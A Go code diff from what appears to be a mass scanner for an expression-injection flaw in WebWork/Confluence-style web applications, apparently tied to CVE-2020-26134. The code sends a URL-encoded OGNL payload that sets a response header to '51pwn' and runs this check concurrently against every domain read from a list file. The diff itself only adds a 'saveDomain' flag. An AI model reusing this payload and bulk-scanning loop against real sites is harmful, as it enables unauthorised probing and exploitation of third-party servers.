@@ -91,6 +91,7 @@ func CheckOptionUrl(url string, domain string) {
 	//client := http.Client{
 	//	Timeout: time.Duration(3 * time.Second),
 	//}
+
 	szPayload := `/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Host%22%2C%2251pwn%22%29%7D/`
 	// req, err := http.NewRequest("OPTION", url + szPayload, nil)
 	req, err := http.NewRequest("GET", url+szPayload, nil)
@@ -133,8 +134,10 @@ func CheckOptionUrl(url string, domain string) {
 func main() {
 	var domainsName string
 	var debug bool
+	var saveDomain bool
 	flag.StringVar(&domainsName, "config", "./allDomains.txt", "config file name")
 	flag.BoolVar(&debug, "debug", false, "debug")
+	flag.BoolVar(&saveDomain, "saveDomain", false, "debug")
 	flag.Parse()
 	if "" != domainsName {
 		s1, err := ioutil.ReadFile(domainsName)
@@ -152,7 +155,9 @@ func main() {
 				//os.Setenv("CacheName", "db/Cve202026134Cache")
 				Log1("domains num: ", len(a))
 				go SaveOut()
-				go server.DoDomainLists(a)
+				if saveDomain {
+					go server.DoDomainLists(a)
+				}
 				for _, x := range a {
 					go func(x1 string) {
 						CheckOption(x1)
